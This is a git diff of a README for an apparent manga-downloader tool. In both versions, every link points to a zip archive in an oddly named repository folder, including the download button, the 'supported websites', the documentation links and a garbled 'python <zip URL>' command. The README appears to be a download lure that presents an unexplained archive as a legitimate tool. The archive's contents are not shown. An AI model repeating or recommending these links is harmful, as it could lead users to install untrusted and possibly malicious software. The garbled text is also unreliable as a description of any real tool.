@@ -1,10 +1,10 @@
 # 📚 mangakakalot_downloader - Enjoy Manga with Ease
 
-[![Download](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip%https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)
+[![Download](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip%https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)
 
 ## 📖 Overview
 
-mangakakalot_downloader is a simple and user-friendly Python application designed for manga fans. This tool allows you to search and download manga from popular websites like https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip, https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip, and https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip With both a command-line interface (CLI) and a graphical user interface (GUI), you can choose the method that you find easiest.
+mangakakalot_downloader is a simple and user-friendly Python application designed for manga fans. This tool allows you to search and download manga from popular websites like https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip, https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip, and https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip With both a command-line interface (CLI) and a graphical user interface (GUI), you can choose the method that you find easiest.
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Once your system meets these requirements, you are ready to download the applica
 
 To get started, visit the following page to download the latest version of the mangakakalot_downloader:
 
-[Download Latest Release](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)
+[Download Latest Release](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -54,7 +54,7 @@ If you prefer the CLI version, here's how to use it:
 3. Run the command to start the downloader:
 
    ```bash
-   python https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip "<manga_title>"
+   python https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip "<manga_title>"
    ```
 
 4. Replace `<manga_title>` with the title of the manga you want to download.
@@ -62,7 +62,7 @@ If you prefer the CLI version, here's how to use it:
 
 ## 📜 Features
 
-- **Multiple Sources**: Download manga from https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip, https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip, and https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip
+- **Multiple Sources**: Download manga from https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip, https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip, and https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip
 - **Search Functionality**: Quickly find your favorite titles using the search bar.
 - **Easy to Use**: Both GUI and CLI options make it accessible for all users.
 - **Organized Downloads**: The application saves your downloaded files in an organized folder structure.
@@ -71,9 +71,9 @@ If you prefer the CLI version, here's how to use it:
 
 mangakakalot_downloader supports the following websites:
 
-- [https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)
-- [https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)
-- [https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)
+- [https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)
+- [https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)
+- [https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)
 
 You can find hundreds of titles and enjoy reading them offline.
 
@@ -98,7 +98,7 @@ We welcome contributions! If you have suggestions for improvements or features, 
 
 For more information and updates:
 
-- [GitHub Repository](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)
-- [Documentation](https://raw.githubusercontent.com/antonio7129/mangakakalot_downloader/main/Endamoebidae/mangakakalot_downloader.zip)
+- [GitHub Repository](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)
+- [Documentation](https://github.com/antonio7129/mangakakalot_downloader/raw/refs/heads/main/Endamoebidae/mangakakalot_downloader_Otidae.zip)
 
 By following these steps, you can easily download and enjoy your favorite manga with mangakakalot_downloader.
